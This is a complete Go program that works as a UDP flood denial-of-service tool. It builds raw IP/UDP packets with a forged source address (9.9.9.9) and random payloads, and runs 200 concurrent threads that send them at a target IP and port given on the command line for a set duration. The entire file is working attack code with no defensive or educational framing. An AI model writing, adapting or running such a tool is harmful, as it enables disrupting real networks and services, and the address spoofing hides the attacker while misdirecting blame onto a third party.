package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"syscall"
	"time"
)

// UDP header structure
type UDPHeader struct {
	SourcePort      uint16
	DestinationPort uint16
	Length          uint16
	Checksum        uint16
}

// IP header structure
type IPHeader struct {
	VersionIHL      uint8
	TypeOfService   uint8
	TotalLength     uint16
	Identification  uint16
	FlagsFragOffset uint16
	TTL             uint8
	Protocol        uint8
	HeaderChecksum  uint16
	SourceIP        [4]byte
	DestIP          [4]byte
}

func checksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 + uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return uint16(^sum)
}

func flood(target string, port int, duration int, wg *sync.WaitGroup) {
	defer wg.Done()

	destIP := net.ParseIP(target).To4()
	if destIP == nil {
		return
	}
	sourceIP := net.ParseIP("9.9.9.9").To4()

	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	packetSize := 1400

	sock, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		fmt.Println("Failed to create raw socket:", err)
		return
	}
	defer syscall.Close(sock)

	addr := syscall.SockaddrInet4{
		Port: port,
	}
	copy(addr.Addr[:], destIP)

	sentPackets := 0
	sentBytes := 0

	for time.Now().Before(endTime) {
		payload := make([]byte, packetSize-28) // 20 bytes IP + 8 bytes UDP header
		rand.Read(payload)

		ipHeader := IPHeader{
			VersionIHL:      (4 << 4) | (20 >> 2),
			TypeOfService:   0,
			TotalLength:     uint16(20 + 8 + len(payload)),
			Identification:  uint16(rand.Intn(65535)),
			FlagsFragOffset: 0,
			TTL:             64,
			Protocol:        syscall.IPPROTO_UDP,
			HeaderChecksum:  0,
		}
		copy(ipHeader.SourceIP[:], sourceIP)
		copy(ipHeader.DestIP[:], destIP)

		udpHeader := UDPHeader{
			SourcePort:      uint16(rand.Intn(65535-1024) + 1024),
			DestinationPort: uint16(port),
			Length:          uint16(8 + len(payload)),
			Checksum:        0,
		}

		// Build packet
		packet := make([]byte, 20+8+len(payload))

		// IP header
		packet[0] = ipHeader.VersionIHL
		packet[1] = ipHeader.TypeOfService
		packet[2] = byte(ipHeader.TotalLength >> 8)
		packet[3] = byte(ipHeader.TotalLength)
		packet[4] = byte(ipHeader.Identification >> 8)
		packet[5] = byte(ipHeader.Identification)
		packet[6] = byte(ipHeader.FlagsFragOffset >> 8)
		packet[7] = byte(ipHeader.FlagsFragOffset)
		packet[8] = ipHeader.TTL
		packet[9] = ipHeader.Protocol
		// Checksum will be filled later
		copy(packet[12:16], ipHeader.SourceIP[:])
		copy(packet[16:20], ipHeader.DestIP[:])

		// UDP header
		packet[20] = byte(udpHeader.SourcePort >> 8)
		packet[21] = byte(udpHeader.SourcePort)
		packet[22] = byte(udpHeader.DestinationPort >> 8)
		packet[23] = byte(udpHeader.DestinationPort)
		packet[24] = byte(udpHeader.Length >> 8)
		packet[25] = byte(udpHeader.Length)
		// Checksum will be filled later

		// Payload
		copy(packet[28:], payload)

		// IP checksum
		ipHeader.HeaderChecksum = checksum(packet[:20])
		packet[10] = byte(ipHeader.HeaderChecksum >> 8)
		packet[11] = byte(ipHeader.HeaderChecksum)

		// UDP checksum (optional, set as zero for speed)
		packet[26] = 0
		packet[27] = 0

		err := syscall.Sendto(sock, packet, 0, &addr)
		if err != nil {
			continue
		}
		sentPackets++
		sentBytes += len(packet)
	}

	fmt.Printf("Thread done: Sent %d packets (%d bytes) to %s:%d (spoofed from 9.9.9.9)\n", sentPackets, sentBytes, target, port)
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: go run udp.go [IP] [PORT] [DURATION]")
		return
	}

	target := os.Args[1]
	port, err1 := strconv.Atoi(os.Args[2])
	duration, err2 := strconv.Atoi(os.Args[3])
	if err1 != nil || err2 != nil {
		fmt.Println("Invalid port or duration")
		return
	}

	rand.Seed(time.Now().UnixNano())

	threads := 200

	var wg sync.WaitGroup
	wg.Add(threads)

	start := time.Now()

	for i := 0; i < threads; i++ {
		go flood(target, port, duration, &wg)
	}

	wg.Wait()

	elapsed := time.Since(start)
	fmt.Printf("All threads completed in %v\n", elapsed)
}
